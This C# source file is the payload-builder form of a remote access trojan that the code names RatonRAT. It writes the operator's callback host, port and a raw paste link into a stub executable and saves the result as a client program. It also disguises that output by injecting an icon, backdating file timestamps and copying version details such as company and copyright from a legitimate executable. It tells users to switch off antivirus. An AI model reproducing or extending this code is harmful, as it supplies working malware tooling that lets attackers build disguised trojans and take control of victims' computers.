using System;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.Threading.Tasks;
using Stuff;
using System.Drawing;
using System.Drawing.Drawing2D;
using Server.Classes;
using System.Collections.Generic;
using Mono.Cecil;
using System.Diagnostics;
using Vestris.ResourceLib;
using RatonRAT;

namespace SillyRAT
{
    public partial class Form3 : Form
    {
        private Image button6Image;

        private Image button7Image;

        private Image button8Image;

        private string selectedIconPath = string.Empty;
        public Form3()
        {
            InitializeComponent();
            this.TopMost = true;
        }

        private void savePorts()
        {
            try
            {
                var portz = new List<string>();
                foreach (var item in listBox2.Items)
                {
                    portz.Add(item.ToString());
                }
                string filePath = Path.Combine("Data", "builderports.json");

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }

                string json = JsonConvert.SerializeObject(portz, Formatting.Indented);
                File.WriteAllText(filePath, json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving ports: {ex.Message}");
            }
        }

        private void saveHosts()
        {
            try
            {
                var hostz = new List<string>();
                foreach (var item in listBox1.Items)
                {
                    hostz.Add(item.ToString());
                }
                string filePath = Path.Combine("Data", "builderhosts.json");

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }

                string json = JsonConvert.SerializeObject(hostz, Formatting.Indented);
                File.WriteAllText(filePath, json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving hosts: {ex.Message}");
            }
        }

        private void loadHost()
        {
            string filePath = Path.Combine("Data", "builderhosts.json");
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath);
                var hostzz = JsonConvert.DeserializeObject<List<string>>(json);
                listBox1.Items.Clear();
                foreach (var host in hostzz)
                {
                    listBox1.Items.Add(host);
                }
            }
            else
            {
                listBox1.Items.Add("127.0.0.1");
            }
        }

        private void loadPort()
        {
            string filePath = Path.Combine("Data", "builderports.json");
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath);
                var portzz = JsonConvert.DeserializeObject<List<string>>(json);
                listBox2.Items.Clear();
                foreach (var port in portzz)
                {
                    listBox2.Items.Add(port);
                }
            }
            else
            {
                listBox2.Items.Add("8888");
            }
        }




        private void button1_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (!string.IsNullOrEmpty(textBox1.Text))
            {
                listBox1.Items.Add(textBox1.Text);
                textBox1.Clear();
            }
            else
            {
                MessageBox.Show("Please insert a valid input", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox1.SelectedItem != null)
            {
                listBox1.Items.Remove(listBox1.SelectedItem);
            }
            else
            {
                MessageBox.Show("Please select a item from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (int.TryParse(textBox2.Text, out int number) && number < 100000)
            {
                listBox2.Items.Add(number.ToString());
                textBox2.Clear();
            }
            else
            {
                MessageBox.Show("Please insert a valid input", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            if (listBox2.SelectedItem != null)
            {
                listBox2.Items.Remove(listBox2.SelectedItem);
            }
            else
            {
                MessageBox.Show("Please select a item from the box", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }
        private void Form3_Load(object sender, EventArgs e)
        {
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
            new RatonRAT.Classes.LightMode().Apply(this);
            check.Start();
            comboBox1.Items.Add("Error");
            comboBox1.Items.Add("Information");
            comboBox1.Items.Add("Warning");
            if (comboBox1.SelectedItem == null)
            {
                comboBox1.SelectedItem = "Error";
            }
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 10));
            button2.Region = new Region(CreateRoundPath(button2.ClientRectangle, 10));
            button3.Region = new Region(CreateRoundPath(button3.ClientRectangle, 10));
            button4.Region = new Region(CreateRoundPath(button4.ClientRectangle, 10));
            button5.Region = new Region(CreateRoundPath(button5.ClientRectangle, 10));
            button6.Region = new Region(CreateRoundPath(button6.ClientRectangle, 10));
            button7.Region = new Region(CreateRoundPath(button7.ClientRectangle, 10));
            button8.Region = new Region(CreateRoundPath(button8.ClientRectangle, 10));
            button9.Region = new Region(CreateRoundPath(button9.ClientRectangle, 10));
            button11.Region = new Region(CreateRoundPath(button11.ClientRectangle, 10));
            loadPort();
            loadHost();
            button6Image = RatonRAT.Properties.Resources.list;
            button6.Invalidate();
            button7Image = RatonRAT.Properties.Resources.start;
            button7.Invalidate();
            button8Image = RatonRAT.Properties.Resources.information;
            button8.Invalidate();
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void waitvro()
        {
            this.BackColor = Color.Black;
            foreach (Control control in this.Controls)
            {
                if (control != this)
                {
                    control.Visible = false;
                    pictureBox2.Visible = true;
                }
            }
            pictureBox2.Visible = true;
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            string stub = @"Builder\Template.exe";
            if (!File.Exists(stub))
            {
                MessageBox.Show("Template not found. Please recompile or reinstall the program with your AV off!", "Building error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox1.SelectedItems.Count == 0 && customSwitch4.Checked == false)
            {
                MessageBox.Show("Please add and select a host from the box or use raw link", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox1.SelectedItems.Count > 1 && customSwitch4.Checked == false)
            {
                MessageBox.Show("Please select only one host or use raw link", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox2.SelectedItems.Count == 0 && customSwitch4.Checked == false)
            {
                MessageBox.Show("Please add and select a port from the box or use raw link", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (listBox2.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please select only one port", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox6.Checked && textBox10.TextLength < 1)
            {
                MessageBox.Show("Please insert some text on the text box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox13.Checked && textBox5.TextLength < 1)
            {
                MessageBox.Show("Please insert atleast a name on the text box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (customSwitch4.Checked)
            {
                if (textBox12.TextLength < 1)
                {
                    MessageBox.Show("Please insert a paste RAW link or disable the option", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            if (txttag.TextLength < 1)
            {
                txttag.Text = "Raton";
            }
            if (textBox10.TextLength < 1 && checkBox6.Checked == true)
            {
                MessageBox.Show("Please insert a title for the message box or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (checkBox10.Checked && (string.IsNullOrEmpty(textBox4.Text) ||
                                        (!textBox4.Text.StartsWith("http://") && !textBox4.Text.StartsWith("https://"))))
            {
                MessageBox.Show("Please insert a valid link or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (customSwitch3.Checked && textBox11.TextLength < 1)
            {
                MessageBox.Show("Please insert a password or disable it", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (checkBox2.Checked) savePorts();
            if (checkBox3.Checked) saveHosts();
            SaveFileDialog saveTemplate = new SaveFileDialog();
            saveTemplate.Filter = "Executable (*.exe)|*.exe";
            saveTemplate.FileName = "RatonClient";
            if (saveTemplate.ShowDialog() == DialogResult.OK)
            {
                waitvro();
                string selectedHost = listBox1.InvokeRequired ? (string)listBox1.Invoke(new Func<string>(() => listBox1.SelectedItem?.ToString())) : listBox1.SelectedItem?.ToString();
                string selectedPort = listBox2.InvokeRequired ? (string)listBox2.Invoke(new Func<string>(() => listBox2.SelectedItem?.ToString())) : listBox2.SelectedItem?.ToString();
                string checkBox1Value = checkBox1.Checked.ToString().ToLower();
                string numericUpDown1Value = numericUpDown1.Value.ToString();
                string checkBox4Value = checkBox4.Checked.ToString().ToLower();
                string checkBox5Value = checkBox5.Checked.ToString().ToLower();
                string checkBox6Value = checkBox6.Checked.ToString().ToLower();
                string textBox3Value = textBox3.Text;
                string comboBox1Value = comboBox1.SelectedItem?.ToString();
                string checkBox8Value = checkBox8.Checked.ToString().ToLower();
                string checkBox9Value = checkBox9.Checked.ToString().ToLower();
                string checkBox10Value = checkBox10.Checked.ToString().ToLower();
                string textBox4Value = textBox4.Text;
                string checkBox11Value = checkBox11.Checked.ToString().ToLower();
                string txttagValue = txttag.Text;
                string textBox10Value = textBox10.Text;
                string customSwitch1Value = customSwitch1.Checked.ToString().ToLower();
                string customSwitch2Value = customSwitch2.Checked.ToString().ToLower();
                string textBox11Value = textBox11.Text;
                string textBox12Value = textBox12.Text;
                button5.Enabled = false;
                button11.Enabled = false;
                button5.Text = "Wait for our rats";
                string outputFile = saveTemplate.FileName;
                byte[] stubBytes = File.ReadAllBytes(stub);
                using (MemoryStream memoryStream = new MemoryStream(stubBytes))
                {
                    ModuleDef module = ModuleDefMD.Load(memoryStream);
                    await Task.Run(() =>
                    {
                        foreach (var type in module.Types)
                        {
                            foreach (var method in type.Methods)
                            {
                                if (!method.HasBody) continue;

                                for (int i = 0; i < method.Body.Instructions.Count; i++)
                                {
                                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (method.Body.Instructions[i].Operand == null) return;

                                        string operandValue = method.Body.Instructions[i].Operand.ToString();

                                        switch (operandValue)
                                        {
                                            case "silly1":
                                                method.Body.Instructions[i].Operand = "Raton_" + Helpers.Random(7);
                                                break;
                                            case "silly2":
                                                method.Body.Instructions[i].Operand = string.IsNullOrEmpty(selectedHost) ? "127.0.0.1" : selectedHost;
                                                break;
                                            case "silly3":
                                                method.Body.Instructions[i].Operand = string.IsNullOrEmpty(selectedPort) ? "8080" : selectedPort;
                                                break;
                                            case "silly4":
                                                method.Body.Instructions[i].Operand = checkBox1Value;
                                                break;
                                            case "silly5":
                                                method.Body.Instructions[i].Operand = numericUpDown1Value;
                                                break;
                                            case "silly6":
                                                method.Body.Instructions[i].Operand = checkBox4Value;
                                                break;
                                            case "silly7":
                                                method.Body.Instructions[i].Operand = checkBox5Value;
                                                break;
                                            case "silly8":
                                                method.Body.Instructions[i].Operand = checkBox6Value;
                                                break;
                                            case "silly9":
                                                method.Body.Instructions[i].Operand = textBox3Value;
                                                break;
                                            case "silly10":
                                                method.Body.Instructions[i].Operand = comboBox1Value;
                                                break;
                                            case "silly11":
                                                method.Body.Instructions[i].Operand = checkBox8Value;
                                                break;
                                            case "silly12":
                                                method.Body.Instructions[i].Operand = checkBox9Value;
                                                break;
                                            case "silly13":
                                                method.Body.Instructions[i].Operand = checkBox10Value;
                                                break;
                                            case "silly14":
                                                method.Body.Instructions[i].Operand = textBox4Value;
                                                break;
                                            case "silly15":
                                                method.Body.Instructions[i].Operand = checkBox11Value;
                                                break;
                                            case "silly16":
                                                method.Body.Instructions[i].Operand = txttagValue;
                                                break;
                                            case "silly17":
                                                method.Body.Instructions[i].Operand = textBox10Value;
                                                break;
                                            case "silly18":
                                                method.Body.Instructions[i].Operand = customSwitch1Value;
                                                break;
                                            case "silly19":
                                                method.Body.Instructions[i].Operand = customSwitch2Value;
                                                break;
                                            case "silly20":
                                                method.Body.Instructions[i].Operand = textBox11Value;
                                                break;
                                            case "silly21":
                                                method.Body.Instructions[i].Operand = textBox12Value;
                                                break;
                                        }
                                    }
                                }
                            }
                        }
                    });
                    module.Write(outputFile);
                    module.Dispose();
                }
                System.Threading.Thread.Sleep(500);

                if (!string.IsNullOrEmpty(selectedIconPath) && File.Exists(selectedIconPath)) // icon inject
                {
                    ResourceModifier.ChangeIcon(saveTemplate.FileName, selectedIconPath);
                }

                if (checkBox7.Checked == true) // date
                {
                    DateTime selectedDate = dateTimePicker1.Value;
                    File.SetCreationTime(outputFile, selectedDate);
                    File.SetLastWriteTime(outputFile, selectedDate);
                    File.SetLastAccessTime(outputFile, selectedDate);
                }

                if (checkBox13.Checked == true)
                {
                    assemblyStuff(saveTemplate.FileName);
                }
                this.Close();
                MessageBox.Show("Build finished", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void assemblyStuff(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);
                versionResource.Language = 0;
                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["InternalName"] = textBox5.Text;
                stringFileInfo["OriginalFilename"] = textBox5.Text;
                stringFileInfo["ProductName"] = textBox6.Text;
                stringFileInfo["CompanyName"] = textBox7.Text;
                stringFileInfo["FileDescription"] = textBox8.Text;
                stringFileInfo["LegalCopyright"] = textBox9.Text;
                stringFileInfo["LegalTrademarks"] = textBox9.Text;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }


        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
            }
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button3.PerformClick();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            panel8.Visible = false;
            panel9.Visible = true;
            panel12.Visible = false;
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button10_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon Files|*.ico;*.exe";
                openFileDialog.Title = "Select a client icon";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedPath = openFileDialog.FileName;
                    string extension = Path.GetExtension(selectedPath).ToLower();

                    if (extension == ".ico")
                    {
                        selectedIconPath = selectedPath;
                        pictureBox1.BackgroundImage = Image.FromFile(selectedIconPath);
                    }
                    else if (extension == ".exe")
                    {
                        using (var icon = Icon.ExtractAssociatedIcon(selectedPath))
                        {
                            if (icon != null)
                            {
                                var largeIconHandle = icon.Handle;
                                using (var largeIcon = Icon.FromHandle(largeIconHandle))
                                {
                                    string tempPath = Path.Combine(Path.GetTempPath(), $"extractedicon_{Helpers.Random(10)}.ico");
                                    using (var fs = new FileStream(tempPath, FileMode.Create))
                                    {
                                        largeIcon.Save(fs);
                                    }

                                    selectedIconPath = tempPath;

                                    using (var stream = new FileStream(selectedIconPath, FileMode.Open, FileAccess.Read))
                                    {
                                        pictureBox1.BackgroundImage = Image.FromStream(stream);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            panel8.Visible = true;
            panel9.Visible = false;
            panel12.Visible = false;
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            panel8.Visible = false;
            panel9.Visible = false;
            panel12.Visible = true;
        }

        private void button6_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button6.Height;
            int newWidth = (button6Image.Width * newHeight) / button6Image.Height;

            e.Graphics.DrawImage(button6Image, new Rectangle(0, 0, newWidth, newHeight));
        }
        private void button7_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button7.Height;
            int newWidth = (button7Image.Width * newHeight) / button7Image.Height;

            e.Graphics.DrawImage(button7Image, new Rectangle(0, 0, newWidth, newHeight));
        }
        private void button8_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            int newHeight = button8.Height;
            int newWidth = (button8Image.Width * newHeight) / button8Image.Height;

            e.Graphics.DrawImage(button8Image, new Rectangle(0, 0, newWidth, newHeight));
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox10_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox10.Checked == true)
            {
                textBox4.Enabled = true;
            } else
            {
                textBox4.Enabled = false;
            }
        }

        private void panel11_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            MessageBox.Show("If the assistance mode is enabled, the user can stop the connection.", "Assistance mode", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                openFileDialog.Title = "Clone assembly";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string exePath = openFileDialog.FileName;

                    try
                    {
                        var assembly = AssemblyDefinition.ReadAssembly(exePath);
                        var module = assembly.MainModule;

                        textBox5.Text = "Nothing";
                        textBox6.Text = "Nothing";
                        textBox7.Text = "Nothing";
                        textBox8.Text = "Nothing";
                        textBox9.Text = "Nothing";

                        foreach (var attr in module.Assembly.CustomAttributes)
                        {
                            string attrName = attr.AttributeType.FullName;
                            string value = attr.ConstructorArguments.Count > 0 ? attr.ConstructorArguments[0].Value.ToString() : "Nothing";

                            if (attrName == "System.Reflection.AssemblyTitleAttribute") textBox5.Text = value;
                            if (attrName == "System.Reflection.AssemblyProductAttribute") textBox6.Text = value;
                            if (attrName == "System.Reflection.AssemblyCompanyAttribute") textBox7.Text = value;
                            if (attrName == "System.Reflection.AssemblyDescriptionAttribute") textBox8.Text = value;
                            if (attrName == "System.Reflection.AssemblyTrademarkAttribute") textBox9.Text = value;
                        }

                        MessageBox.Show("Loaded successfully!", ":3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (BadImageFormatException)
                    {
                        FileVersionInfo fileInfo = FileVersionInfo.GetVersionInfo(exePath);

                        textBox5.Text = fileInfo.FileDescription ?? "Nothing";
                        textBox6.Text = fileInfo.ProductName ?? "Nothing";
                        textBox7.Text = fileInfo.CompanyName ?? "Nothing";
                        textBox8.Text = fileInfo.Comments ?? "Nothing";
                        textBox9.Text = fileInfo.LegalTrademarks ?? "Nothing";

                        MessageBox.Show("Loaded successfully!", ":3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private void panel8_Paint(object sender, PaintEventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void check_Tick(object sender, EventArgs e)
        {
            if(customSwitch4.Checked == true)
            {
                textBox1.Enabled = false;
                textBox2.Enabled = false;
                textBox12.Enabled = true;
                listBox1.Enabled = false;
                listBox2.Enabled = false;

            } else
            {
                listBox1.Enabled = true;
                listBox2.Enabled = true;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                textBox12.Enabled = false;
            }

            if (customSwitch3.Checked == true)
            {
                textBox11.Enabled = true;
            } else
            {
                textBox11.Enabled = false;
            }

            if (checkBox10.Checked == true)
            {
                textBox4.Enabled = true;
            }
            else
            {
               textBox4.Enabled = false;
            }

            if (checkBox6.Checked == true)
            {
                comboBox1.Enabled = true;
                textBox10.Enabled = true;
                textBox3.Enabled = true;
            }
            else
            {
                textBox3.Enabled = false;
                textBox10.Enabled = false;
                comboBox1.Enabled = false;
            }
            if (checkBox7.Checked == true)
            {
                dateTimePicker1.Enabled = true;
            }
            else
            {
                dateTimePicker1.Enabled = false;
            }
            if (checkBox13.Checked == true)
            {
                button13.Enabled = true;
                textBox5.Enabled = true;
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                textBox8.Enabled = true;
                textBox9.Enabled = true;
            }
            else
            {
                button13.Enabled = false;
                textBox5.Enabled = false;
                textBox6.Enabled = false;
                textBox7.Enabled = false;
                textBox8.Enabled = false;
                textBox9.Enabled = false;
            }
        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void customSwitch1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void panel9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void textBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void button9_Click_1(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void customSwitch4_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void textBox12_Enter(object sender, EventArgs e)
        {
            textBox12.Clear();
            textBox12.ForeColor = Color.White;
        }

        private void textBox12_Leave(object sender, EventArgs e)
        {

        }
    }
}
